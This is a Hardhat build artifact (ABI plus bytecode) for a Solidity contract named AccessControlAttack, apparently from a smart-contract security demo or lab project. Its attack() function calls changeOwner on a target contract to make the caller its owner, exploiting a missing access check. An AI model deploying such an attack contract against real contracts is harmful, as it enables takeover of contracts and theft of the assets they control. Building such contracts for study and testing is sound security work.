{
  "_format": "hh-sol-artifact-1",
  "contractName": "AccessControlAttack",
  "sourceName": "contracts/attacker/AccessControlAttack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "target",
      "outputs": [
        {
          "internalType": "contract IAccessControl",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610337380380610337833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b610220806101176000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80639e5faafc1461003b578063d4b8399214610045575b600080fd5b610043610063565b005b61004d6100f0565b60405161005a9190610193565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1336040518263ffffffff1660e01b81526004016100bc91906101cf565b600060405180830381600087803b1580156100d657600080fd5b505af11580156100ea573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061015961015461014f84610114565b610134565b610114565b9050919050565b600061016b8261013e565b9050919050565b600061017d82610160565b9050919050565b61018d81610172565b82525050565b60006020820190506101a86000830184610184565b92915050565b60006101b982610114565b9050919050565b6101c9816101ae565b82525050565b60006020820190506101e460008301846101c0565b9291505056fea26469706673582212202620a5bc995ee1c986b523b123d4a9a4348c0cb4102cacc204ae5f63b87813a964736f6c63430008180033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}